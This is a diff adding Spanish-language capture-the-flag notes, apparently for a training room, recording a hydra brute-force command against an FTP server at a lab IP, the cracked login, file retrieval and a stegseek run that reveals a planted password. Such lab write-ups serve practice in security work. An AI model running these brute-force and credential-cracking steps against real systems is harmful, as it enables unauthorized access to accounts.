@@ -25,3 +25,16 @@ Agent R
 - Chris contraseña débil y R y J tienen un acuerdo.
 - Probamos fuerza bruta en ftp con chris
 - hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.128.166.133
+- [21][ftp] host: 10.128.166.133   login: chris   password: X
+- ACcedemos a ftp y nios traemos 3 archivos de chris.
+- estonografia un emensaje diciendo que la contrasseña esta en las fotos
+- stegseek cute-alien.jpg -> y en el output veo │
+- Hi james,
+   2 │ 
+   3 │ Glad you find this message. Your login password is hackerrules!
+   4 │ 
+   5 │ Don't ask me why the password look cheesy, ask agent R who set this password for you.
+   6 │ 
+   7 │ Your buddy,
+   8 │ chris
+
